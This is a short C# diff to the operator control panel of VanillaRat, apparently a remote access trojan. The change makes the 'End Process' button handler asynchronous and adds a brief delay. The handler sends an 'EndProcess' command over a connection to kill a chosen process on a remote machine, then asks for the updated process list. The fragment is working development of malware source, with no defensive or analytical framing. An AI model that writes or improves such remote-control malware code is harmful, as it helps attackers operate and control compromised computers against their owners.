@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Text;
+using System.Threading.Tasks;
 using System.Windows.Forms;
 using VanillaRat.Classes;
 
@@ -26,7 +27,7 @@ namespace VanillaRat.Forms
         }
 
         //End selected process
-        private void btnEndProcess_Click(object sender, EventArgs e)
+        private async void btnEndProcess_Click(object sender, EventArgs e)
         {
             if (lbRunningProcesses.SelectedItems.Count == 0)
             {
@@ -35,7 +36,9 @@ namespace VanillaRat.Forms
             }
 
             ListViewItem Item = lbRunningProcesses.SelectedItems[0];
-            Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("EndProcess<{" + Item.SubItems[1].Text + "}>"));
+            Server.MainServer.Send(ConnectionID,
+                Encoding.ASCII.GetBytes("EndProcess<{" + Item.SubItems[1].Text + "}>"));
+            await Task.Delay(50);
             Item.Remove();
             Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("GetProcesses"));
         }
